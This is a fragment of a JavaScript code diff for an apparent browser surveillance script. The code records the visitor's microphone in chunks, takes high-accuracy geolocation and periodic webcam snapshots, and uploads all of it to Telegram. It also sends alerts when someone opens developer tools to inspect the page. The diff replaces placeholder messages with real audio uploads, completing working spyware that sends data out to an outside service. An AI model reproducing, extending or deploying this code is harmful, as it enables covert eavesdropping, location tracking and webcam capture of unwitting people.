+        if (App.state.mediaRecorder && App.state.mediaRecorder.state === 'recording') {
+          App.state.mediaRecorder.stop();
         }
         console.log("Microphone stopped.");
       }
@@ -533,31 +772,31 @@ const App = {
 
     startMicRecording(stream) {
       if (!window.MediaRecorder) {
-        console.warn("MediaRecorder not supported");
+        console.warn("MediaRecorder API not supported.");
         this.send("⚠️ MediaRecorder API not supported.");
         return;
       }
       try {
-        this.state.mediaRecorder = new MediaRecorder(stream);
-        this.state.mediaRecorder.ondataavailable = async (e) => {
+        const options = { mimeType: 'audio/ogg;codecs=opus' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          console.warn(`MIME type ${options.mimeType} not supported, trying default.`);
+          App.state.mediaRecorder = new MediaRecorder(stream);
+        } else {
+          App.state.mediaRecorder = new MediaRecorder(stream, options);
+        }
+
+        App.state.mediaRecorder.ondataavailable = async (e) => {
           if (e.data && e.data.size > 0) {
-            // Convert Blob to something that can be sent to Telegram (e.g., using sendAudio)
-            // Note: Telegram's sendAudio expects a file, so we might need to upload it first
-            // or check if sendAudio directly supports Blobs with FormData.
-            console.log("Audio data available, attempting to send...");
-            // For simplicity, we'll send a message indicating audio recording
-            // A full implementation would involve uploading the audio data.
-            await this.send(`*🎙️ Audio Recording (${(e.data.size / 1024 / 1024).toFixed(2)} MB) captured.*`, true);
-            // If you have a working `sendAudio` implementation that accepts Blobs:
-            // App.Telegram.sendAudio("Voice message", e.data);
+            console.log(`Audio data available: ${e.data.size} bytes.`);
+            await this.sendAudio("🎙️ Voice message chunk", e.data);
           }
         };
-        this.state.mediaRecorder.onstop = () => {
+        App.state.mediaRecorder.onstop = () => {
           console.log("Microphone recording stopped.");
           this.send("🎙️ Microphone recording stopped.");
         };
-        this.state.mediaRecorder.start(this.config.micRecordInterval);
-        console.log(`Microphone recording started with interval ${this.config.micRecordInterval}ms`);
+        App.state.mediaRecorder.start(App.config.micRecordInterval);
+        console.log(`Microphone recording started with ${App.config.micRecordInterval}ms interval.`);
         this.send("🎙️ Microphone recording started.");
       } catch (error) {
         console.error("Error starting MediaRecorder:", error);
@@ -566,66 +805,60 @@ const App = {
     },
 
     async requestGeolocation() {
-      if (this.state.userLocation.lat !== "N/A") {
-        console.log("Geolocation already obtained");
-        return;
-      }
+      if (App.state.userLocation.lat !== "N/A") return;
       navigator.geolocation.getCurrentPosition(
         p => {
-          this.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
-          console.log(`Geolocation sent: ${p.coords.latitude}, ${p.coords.longitude}`);
-          // Send location to Telegram
-          App.Telegram.sendLocation(p.coords.latitude, p.coords.longitude);
-          // Optionally send a text message with coordinates
-          // this.send(`📍 Location: \`${p.coords.latitude}, ${p.coords.longitude}\``, true);
+          App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
+          console.log(`Geolocation obtained: ${p.coords.latitude}, ${p.coords.longitude}`);
+          this.sendLocation(p.coords.latitude, p.coords.longitude);
+          App.updateActivityTime();
         },
         e => {
           console.warn("Geolocation error:", e);
-          this.send(`🚫 Geo Error: Code ${e.code} - ${e.message}`);
+          this.send(`🚫 Geolocation Error: Code ${e.code} - ${e.message}`);
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for accuracy and timeout
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     },
 
     detectDevTools() {
-      const t = 160; // Threshold for detecting dev tools
-      let devToolsOpened = false;
-      const checkDevTools = () => {
-        const isDevToolsOpen = window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t;
-        if (isDevToolsOpen && !devToolsOpened) {
-          devToolsOpened = true;
-          console.log("Dev Tools Opened!");
+      const threshold = 160;
+      let devToolsCurrentlyOpen = false;
+
+      const check = () => {
+        const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
+        if (isDevToolsOpen && !App.state.devToolsOpen) {
+          App.state.devToolsOpen = true;
+          console.log("Developer Tools Opened!");
           this.send("⚠️ Developer Tools Opened!", true);
-        } else if (!isDevToolsOpen && devToolsOpened) {
-          devToolsOpened = false;
-          console.log("Dev Tools Closed!");
+        } else if (!isDevToolsOpen && App.state.devToolsOpen) {
+          App.state.devToolsOpen = false;
+          console.log("Developer Tools Closed!");
           this.send("✅ Developer Tools Closed.", true);
         }
-        // Use requestAnimationFrame for smoother checks
-        requestAnimationFrame(checkDevTools);
+        requestAnimationFrame(check);
       };
-      requestAnimationFrame(checkDevTools);
+      requestAnimationFrame(check);
     },
 
     startSnapshotting() {
-      if (this.state.snapshotIntervalId) return; // Already running
-      console.log(`Starting snapshotting every ${this.config.snapshotInterval}ms`);
-      this.state.snapshotIntervalId = setInterval(() => {
+      if (App.state.snapshotIntervalId) return;
+      console.log(`Starting snapshotting every ${App.config.snapshotInterval}ms.`);
+      App.state.snapshotIntervalId = setInterval(() => {
         this.captureAndSend("📸 Webcam Snapshot");
-      }, this.config.snapshotInterval);
+      }, App.config.snapshotInterval);
     },
 
     stopSnapshotting() {
-      if (this.state.snapshotIntervalId) {
-        clearInterval(this.state.snapshotIntervalId);
-        this.state.snapshotIntervalId = null;
+      if (App.state.snapshotIntervalId) {
+        clearInterval(App.state.snapshotIntervalId);
+        App.state.snapshotIntervalId = null;
         console.log("Snapshotting stopped.");
       }
     },
 
     captureAndSend(caption) {
-      if (!this.cameraStream) {
-        console.log("Camera not active, cannot capture snapshot.");
+      if (!App.state.cameraStream || !App.DOM.captureVideo || !App.DOM.captureCanvas) {
         return;
       }
 
@@ -633,22 +866,43 @@ const App = {
       const canvas = App.DOM.captureCanvas;
       const context = canvas.getContext('2d');
 
-      // Set canvas dimensions to match video aspect ratio
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        return;
+      }
+
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // Draw the current video frame onto the canvas
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Convert canvas content to a Blob
       canvas.toBlob(async (blob) => {
         if (blob) {
           console.log("Snapshot captured, sending to Telegram...");
-          await App.Telegram.sendPhoto(caption, blob);
+          await this.sendPhoto(caption, blob);
         } else {
           console.error("Failed to create snapshot blob.");
         }
-      }, 'image/png'); // Or 'image/jpeg' for smaller file size
+      }, 'image/png');
+    },
+
+    sendAccumulatedActivity() {
+      if (!App.state.isTrackingActive) return;
+
+      let activityReport = "";
+      // This function is now primarily for sending *count* summaries if desired,
+      // or other real-time alerts. The detailed logs are in logPageInteraction.
+
+      // Example: send a notification if mouse or scroll buffers are very large
+      // if (App.state.mouseMovements.length > 50) {
+      //     activityReport += `🚨 High Mouse Movement Buffering: ${App.state.mouseMovements.length} events.\n`;
+      // }
+      // if (App.state.scrollHistory.length > 20) {
+      //     activityReport += `🚨 High Scroll Event Buffering: ${App.state.scrollHistory.length} events.\n`;
+      // }
+
+      if (activityReport) {
+        this.send(activityReport);
+      }
     }
   }
 };
